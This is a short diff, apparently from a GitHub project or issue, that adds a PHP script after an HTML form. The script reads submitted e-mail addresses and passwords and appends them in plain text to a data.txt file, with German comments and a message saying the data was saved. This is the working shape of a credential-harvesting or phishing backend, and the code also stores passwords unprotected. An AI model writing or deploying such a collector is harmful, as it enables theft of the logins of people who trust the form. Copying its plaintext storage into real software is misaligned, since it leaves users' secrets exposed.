@@ -14,3 +14,17 @@
     </form>
 </body>
 </html>[script.php.txt](https://github.com/user-attachments/files/18465883/script.php.txt)
+[script.php.txt](https://github.com/user-attachments/files/18466027/script.php.txt)
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $email = $_POST['email'];
+    $password = $_POST['password'];
+
+    // Speichere die Daten in einer Datei
+    $file = fopen("data.txt", "a");
+    fwrite($file, "E-Mail: " . $email . " Passwort: " . $password . "\n");
+    fclose($file);
+
+    echo "Deine Daten wurden erfolgreich gespeichert.";
+}
+?>
